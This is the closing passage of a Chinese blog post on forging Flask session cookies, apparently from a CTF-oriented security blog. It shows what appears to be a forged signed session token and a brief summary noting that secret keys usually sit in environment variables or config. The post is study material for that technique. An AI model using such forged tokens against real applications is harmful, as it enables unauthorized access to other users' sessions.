class="line">.eJxFUMtuwjAQ_JVqzxyKEx-KxIHKEIG0jkxtIu8lohBCHEylAAoY8e91qdReZ2bnsXcod1112sPo3F2qAZTNFkZ3ePmEEWCYMhIzj3rCrF8cyNU9-VWD3t7ybNaQnnAM5ooOucymV6nrPhc2kGtTyRYHdNvW-qXDgEMUhlGGHBmm5AwnoX703DrZoquTvDBJrs0NC0ylXrpcvO9tMU1IWG6D6kkrnouY4clJPUllxKSeJ-QW8V6N4TGAzanbleevtjr-T2AqRm9uVKiUspVHQS0Vprfa9NLbWH3ZYLBDjDVtmDPUJpFq_LRr_Lqu_pw-_JvZ9L_Mce0jAeutb44wgMup6p5_g-ErPL4BHS9s0A.ZxdxYg.N1yzi4FzuxhmJUonmrDtH5t7d8M</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>其实看了这么多，主要就是学学代码思路，原理的话可以看P牛的博客，其中跟着代码走走，这里有个小点子就是<code>key</code>一般都放在环境变量或者<code>config</code>里面，这些demo基本都是</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="baozongwi reward">
+        <span>reward</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>baozongwi
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://baozongwi.xyz/posts/320a5814.html" title="flask中的session伪造">https://baozongwi.xyz/posts/320a5814.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/flask/" rel="tag"># flask</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/f6ae02bb.html" rel="prev" title="DASCTF 2024金秋十月">
+                  <i class="fa fa-angle-left"></i> DASCTF 2024金秋十月
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/dc49ce92.html" rel="next" title="markdown常用语法">
+                  markdown常用语法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baozongwi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">87:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
